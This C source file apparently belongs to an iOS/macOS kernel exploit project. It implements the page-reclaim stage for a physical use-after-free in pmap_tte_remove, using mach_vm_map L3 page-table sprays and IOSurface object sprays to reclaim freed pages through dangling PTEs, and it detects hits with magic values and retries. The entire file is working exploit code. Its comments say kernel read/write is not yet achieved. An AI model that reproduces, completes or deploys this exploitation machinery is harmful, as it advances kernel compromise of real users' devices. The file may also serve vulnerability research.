/*
 * pmap_reclaim.c — SPTM reclaim bridge for pmap_tte_remove PUAF
 *
 * Strategies (from RESEARCH/pmap-tte-remove):
 *   1. L3 32MB-spaced mach_vm_map spray (v17) — force pmap_pages_alloc on new L3 windows
 *   2. IOSurface 64×64×4 spray (v15) — reclaim freed 16KB page as pixel buffer
 *
 * On A14+ (SPTM), L3 pages are quarantined — both strategies are probabilistic.
 * reclaim_ready = L3 fault/change OR IOSurface MAGIC hit.
 * krw_ready = IOSurface object corruption with userspace readback (strongest escalation).
 */

#include "pmap_reclaim.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <dlfcn.h>
#include <mach/vm_map.h>

#if defined(__APPLE__)
#include <CoreFoundation/CoreFoundation.h>
#endif

extern kern_return_t mach_vm_allocate(vm_map_t, mach_vm_address_t *, mach_vm_size_t, int);
extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);
extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t,
    mach_vm_offset_t, int, mem_entry_name_port_t, memory_object_offset_t,
    boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);

static sigjmp_buf g_reclaim_jmp;
static volatile int g_reclaim_faulted;

static void reclaim_fault_handler(int sig)
{
    (void)sig;
    g_reclaim_faulted = 1;
    siglongjmp(g_reclaim_jmp, 1);
}

static int safe_read32(volatile void *addr, uint32_t *out)
{
    g_reclaim_faulted = 0;
    if (sigsetjmp(g_reclaim_jmp, 1) == 0) {
        *out = *(volatile uint32_t *)addr;
        return 1;
    }
    return 0;
}

static int baseline_write_through(const pmap_puaf_state_t *state)
{
    int wt = 0;
    for (int i = 0; i < state->dangling_ptes; i++) {
        volatile uint8_t *p = (volatile uint8_t *)state->maps[i];
        *p = 0xBB;
        if (*p == 0xBB) {
            wt++;
        }
    }
    return wt;
}

static void mark_freed_page(volatile uint32_t *page)
{
    for (int j = 0; j < (int)(PMAP_PUAF_PAGE_SZ / 4); j++) {
        page[j] = PMAP_RECLAIM_MAGIC_U32;
    }
    __asm__ volatile("dsb ish" ::: "memory");
}

/* --- IOSurface dynamic loader --- */

typedef void *IOSurfaceRef;
typedef uint32_t IOSurfaceLockOptions;

typedef struct {
    int loaded;
    IOSurfaceRef (*create)(CFDictionaryRef);
    kern_return_t (*lock)(IOSurfaceRef, IOSurfaceLockOptions, uint32_t *);
    kern_return_t (*unlock)(IOSurfaceRef, IOSurfaceLockOptions, uint32_t *);
    void *(*get_base)(IOSurfaceRef);
    size_t (*get_size)(IOSurfaceRef);
    CFStringRef *key_width;
    CFStringRef *key_height;
    CFStringRef *key_bpe;
    CFStringRef *key_format;
} iosurface_api_t;

static iosurface_api_t g_iosurface;

static int load_iosurface_api(void)
{
    if (g_iosurface.loaded) {
        return 1;
    }

    void *lib = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface",
                       RTLD_LAZY | RTLD_LOCAL);
    if (!lib) {
        return 0;
    }

#define LOAD(sym, name) do { \
    sym = dlsym(lib, name); \
    if (!sym) return 0; \
} while (0)

    LOAD(g_iosurface.create, "IOSurfaceCreate");
    LOAD(g_iosurface.lock, "IOSurfaceLock");
    LOAD(g_iosurface.unlock, "IOSurfaceUnlock");
    LOAD(g_iosurface.get_base, "IOSurfaceGetBaseAddress");
    LOAD(g_iosurface.get_size, "IOSurfaceGetAllocSize");
    LOAD(g_iosurface.key_width, "kIOSurfaceWidth");
    LOAD(g_iosurface.key_height, "kIOSurfaceHeight");
    LOAD(g_iosurface.key_bpe, "kIOSurfaceBytesPerElement");
    LOAD(g_iosurface.key_format, "kIOSurfacePixelFormat");
#undef LOAD

    g_iosurface.loaded = 1;
    return 1;
}

static IOSurfaceRef make_iosurface_16k(void)
{
    int w = 64, h = 64, bpe = 4, pf = 0x42475241; /* BGRA */
    CFNumberRef cw = CFNumberCreate(NULL, kCFNumberSInt32Type, &w);
    CFNumberRef ch = CFNumberCreate(NULL, kCFNumberSInt32Type, &h);
    CFNumberRef cb = CFNumberCreate(NULL, kCFNumberSInt32Type, &bpe);
    CFNumberRef cp = CFNumberCreate(NULL, kCFNumberSInt32Type, &pf);

    const void *keys[] = { *g_iosurface.key_width, *g_iosurface.key_height,
                           *g_iosurface.key_bpe, *g_iosurface.key_format };
    const void *vals[] = { cw, ch, cb, cp };

    CFDictionaryRef dict = CFDictionaryCreate(NULL, keys, vals, 4,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);

    IOSurfaceRef surf = g_iosurface.create(dict);
    CFRelease(dict);
    CFRelease(cw);
    CFRelease(ch);
    CFRelease(cb);
    CFRelease(cp);
    return surf;
}

static int run_l3_spray(const pmap_puaf_state_t *state, int spray_count,
                        int *faults, int *changed, int *unchanged)
{
    mach_vm_address_t *spray = calloc((size_t)spray_count, sizeof(mach_vm_address_t));
    if (!spray) {
        return -1;
    }

    int sprayed = 0;
    for (int i = 0; i < spray_count; i++) {
        mach_vm_address_t hint = PMAP_RECLAIM_SPRAY_BASE + (mach_vm_address_t)i * PMAP_RECLAIM_L3_SPAN;
        mach_vm_address_t sa = hint;
        kern_return_t kr = mach_vm_map(mach_task_self(), &sa, PMAP_PUAF_PAGE_SZ, 0,
            VM_FLAGS_ANYWHERE, MACH_PORT_NULL, 0, FALSE,
            VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
        if (kr != KERN_SUCCESS) {
            continue;
        }
        *(volatile uint8_t *)sa = 0xAB;
        spray[i] = sa;
        sprayed++;
    }

    int f = 0, c = 0, u = 0;
    for (int i = 0; i < state->dangling_ptes; i++) {
        uint32_t val = 0;
        if (!safe_read32((volatile void *)state->maps[i], &val)) {
            f++;
        } else if (val == PMAP_RECLAIM_MAGIC_U32) {
            u++;
        } else {
            c++;
        }
    }

    for (int i = 0; i < spray_count; i++) {
        if (spray[i]) {
            mach_vm_deallocate(mach_task_self(), spray[i], PMAP_PUAF_PAGE_SZ);
        }
    }
    free(spray);

    if (faults) *faults = f;
    if (changed) *changed = c;
    if (unchanged) *unchanged = u;
    return sprayed;
}

static int run_iosurface_spray(const pmap_puaf_state_t *state, int spray_count,
                               int *hits, int *hit_index)
{
    if (!load_iosurface_api()) {
        return -1;
    }

    IOSurfaceRef *surfs = calloc((size_t)spray_count, sizeof(IOSurfaceRef));
    if (!surfs) {
        return -1;
    }

    int created = 0;
    for (int i = 0; i < spray_count; i++) {
        surfs[i] = make_iosurface_16k();
        if (!surfs[i]) {
            continue;
        }
        created++;
        uint32_t seed = 0;
        if (g_iosurface.lock(surfs[i], 0, &seed) == 0) {
            void *base = g_iosurface.get_base(surfs[i]);
            if (base) {
                memset(base, (uint8_t)(i & 0xff), PMAP_PUAF_PAGE_SZ);
            }
            g_iosurface.unlock(surfs[i], 0, &seed);
        }
    }

    for (int i = 0; i < state->dangling_ptes; i++) {
        volatile uint64_t *p = (volatile uint64_t *)state->maps[i];
        for (int j = 0; j < (int)(PMAP_PUAF_PAGE_SZ / sizeof(uint64_t)); j++) {
            p[j] = PMAP_RECLAIM_MAGIC_U64;
        }
    }
    __asm__ volatile("dsb ish" ::: "memory");

    int found = 0;
    int first_hit = -1;
    for (int i = 0; i < spray_count; i++) {
        if (!surfs[i]) {
            continue;
        }
        uint32_t seed = 0;
        if (g_iosurface.lock(surfs[i], 1, &seed) != 0) {
            continue;
        }
        void *base = g_iosurface.get_base(surfs[i]);
        size_t sz = g_iosurface.get_size(surfs[i]);
        if (base && sz >= sizeof(uint64_t)) {
            uint64_t *buf = (uint64_t *)base;
            size_t n64 = sz / sizeof(uint64_t);
            for (size_t j = 0; j < n64; j++) {
                if (buf[j] == PMAP_RECLAIM_MAGIC_U64) {
                    found++;
                    if (first_hit < 0) {
                        first_hit = i;
                    }
                    break;
                }
            }
        }
        g_iosurface.unlock(surfs[i], 1, &seed);
    }

    for (int i = 0; i < spray_count; i++) {
        if (surfs[i]) {
            CFRelease(surfs[i]);
        }
    }
    free(surfs);

    if (hits) *hits = found;
    if (hit_index) *hit_index = first_hit;
    return created;
}

static int run_single_reclaim_attempt(const pmap_reclaim_config_t *cfg, pmap_reclaim_result_t *out)
{
    struct sigaction sa_old, sa_new;
    memset(&sa_new, 0, sizeof(sa_new));
    sa_new.sa_handler = reclaim_fault_handler;
    sigemptyset(&sa_new.sa_mask);
    sigaction(SIGSEGV, &sa_new, &sa_old);
    sigaction(SIGBUS, &sa_new, NULL);

    pmap_puaf_state_t puaf;
    int dangling = pmap_puaf_create(&puaf);
    if (dangling < 0) {
        sigaction(SIGSEGV, &sa_old, NULL);
        sigaction(SIGBUS, &sa_old, NULL);
        snprintf(out->error, sizeof(out->error), "PUAF creation failed");
        return -1;
    }

    out->write_through = baseline_write_through(&puaf);
    mark_freed_page((volatile uint32_t *)puaf.maps[0]);

    int l3_faults = 0, l3_changed = 0, l3_unchanged = 0;
    int iosurface_hits = 0, iosurface_hit_index = -1;

    if (cfg->try_l3_spray) {
        run_l3_spray(&puaf, cfg->spray_count, &l3_faults, &l3_changed, &l3_unchanged);
    }

    if (cfg->try_iosurface) {
        run_iosurface_spray(&puaf, cfg->spray_count, &iosurface_hits, &iosurface_hit_index);
    }

    pmap_puaf_destroy(&puaf);

    sigaction(SIGSEGV, &sa_old, NULL);
    sigaction(SIGBUS, &sa_old, NULL);

    out->l3_faults = l3_faults;
    out->l3_changed = l3_changed;
    out->l3_unchanged = l3_unchanged;
    out->iosurface_hits = iosurface_hits;
    out->iosurface_hit_index = iosurface_hit_index;

    int l3_hit = (l3_faults > 0) || (l3_changed > 0);
    int iosurface_hit = iosurface_hits > 0;

    if (l3_hit && iosurface_hit) {
        out->strategy = PMAP_RECLAIM_COMBINED;
        snprintf(out->strategy_name, sizeof(out->strategy_name), "combined");
    } else if (iosurface_hit) {
        out->strategy = PMAP_RECLAIM_IOSURFACE;
        snprintf(out->strategy_name, sizeof(out->strategy_name), "iosurface");
    } else if (l3_hit) {
        out->strategy = PMAP_RECLAIM_L3_SPRAY;
        snprintf(out->strategy_name, sizeof(out->strategy_name), "l3_spray");
    } else {
        out->strategy = PMAP_RECLAIM_NONE;
        snprintf(out->strategy_name, sizeof(out->strategy_name), "none");
    }

    /* Signals only — MAGIC/fault hits are NOT arbitrary kernel virtual R/W. */
    out->reclaim_ready = (l3_hit || iosurface_hit) ? 1 : 0;
    out->object_corrupt_ready = iosurface_hit ? 1 : 0;
    out->krw_ready = 0; /* stays false until a real virtual kread/kwrite bridge exists */

    if (iosurface_hit) {
        snprintf(out->verdict, sizeof(out->verdict),
                 "IOSurface MAGIC HIT (%d) — object-corrupt signal only; virtual kRW NOT bridged",
                 iosurface_hits);
    } else if (l3_faults > 0) {
        snprintf(out->verdict, sizeof(out->verdict),
                 "L3 reclaim signal — %d faults (page may be L3); virtual kRW NOT bridged", l3_faults);
    } else if (l3_changed > 0) {
        snprintf(out->verdict, sizeof(out->verdict),
                 "L3 reclaim signal — %d PTE slots changed; virtual kRW NOT bridged", l3_changed);
    } else {
        snprintf(out->verdict, sizeof(out->verdict),
                 "SPTM reclaim MISS — PUAF %d/%d write-through, retry or increase spray",
                 out->write_through, PMAP_PUAF_KEEP);
    }

    return out->reclaim_ready ? 1 : 0;
}

int pmap_reclaim_execute(const pmap_reclaim_config_t *cfg, pmap_reclaim_result_t *out)
{
    if (!cfg || !out) {
        return -1;
    }

    memset(out, 0, sizeof(*out));
    out->spray_count = cfg->spray_count > 0 ? cfg->spray_count : 1024;
    out->retry_attempts = cfg->max_retries > 0 ? cfg->max_retries : 1;

    pmap_reclaim_config_t local = *cfg;
    if (local.spray_count <= 0) {
        local.spray_count = 1024;
    }
    if (local.max_retries <= 0) {
        local.max_retries = 1;
    }
    if (!local.try_l3_spray && !local.try_iosurface) {
        local.try_l3_spray = 1;
        local.try_iosurface = 1;
    }

    for (int attempt = 0; attempt < local.max_retries; attempt++) {
        pmap_reclaim_result_t attempt_result;
        memset(&attempt_result, 0, sizeof(attempt_result));
        attempt_result.spray_count = local.spray_count;
        attempt_result.retry_attempts = attempt + 1;

        int rc = run_single_reclaim_attempt(&local, &attempt_result);
        if (rc > 0) {
            *out = attempt_result;
            out->retry_attempts = attempt + 1;
            return 1;
        }

        if (attempt == 0) {
            *out = attempt_result;
        }
    }

    return out->reclaim_ready ? 1 : 0;
}
